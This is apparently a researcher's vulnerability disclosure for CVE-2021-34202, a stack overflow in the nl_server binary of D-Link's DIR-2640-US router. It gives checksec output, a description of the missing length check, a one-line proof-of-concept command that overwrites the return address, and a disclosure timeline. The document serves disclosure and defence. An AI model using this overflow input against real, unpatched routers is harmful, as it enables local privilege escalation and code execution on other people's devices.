# Stack Overflow in DIR-2640-US Router

## Overview

- **CVE ID**: [CVE-2021-34202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34202)

- **Type**: [Out-of-bounds Write *- (787)*](http://cwe.mitre.org/data/definitions/787.html)

- **Vendor**: D-LINK (https://www.dlink.com/)

- **Products**: WiFi Router, such as DIR-2640-US.

- **Version**: Firmware (1.01B04)

- **Fix**: None

## Severity

**High** 7.8 CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Description

Multiple out-of-bounds vulnerabilities in some processes of D-Link AC2600(DIR-2640). Ordinary permissions can be elevated to administrator permissions, resulting in local arbitrary code execution.  An attacker can combine other vulnerabilities to further achieve the purpose of remote code execution.

Ordinary users can run `nl_server`.

```shell
admin@dlinkrouter:~$ ls -l ./usr/bin/nl_server 
-rwxr-xr-x    1     18616 May 23  2021 ./usr/bin/nl_server
```

`nl_server` does not enable any safe compilation options.

```shell
gef➤  checksec
[+] checksec for '_DIR2640A1_FW101B04.bin.extracted/_A0.extracted/_856EA8.extracted/cpio-root/usr/bin/nl_server'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

The process does not limit the length of parameters entered by the user.

![main_function](./images/main_function.png)

The variable `dword_414140`  is used again in the `sub_401F40`.

![main](images/main.png)

The variables entered by the user are stored in the stack space. Therefore, there is a stack overflow vulnerability in this function.

![stack_over_flow](images/stack_over_flow.png)



[CVE-2021-34203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34203)  brought good news

> Is this parameter controllable externally?

## How to Reproduce (PoC)

Direct method

```shell
$ nl_server -i aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234
```

![poc1](images/poc1.png)

The return address of the process is directly modified by us to 1234 (ascii: 34333231)

## How to Exploit (exp)

Waiting...

## Disclosure Timeline

- 8-Feb-2021 Discoverd the vulnerability
- 9-Feb-2021 Responsibly disclosed vulnerability to vendor
- 10-Feb-2021 D-Link PSIRT would raise to R&D
- 31-Mar-2021 D-Link R&D was investigating the report
- 2-Jun-2021 Requested for CVE-ID assignment

- 10-Jun-2021 CVE-ID Assigned
- 13-Jun-2021 Notified CVE about a publication
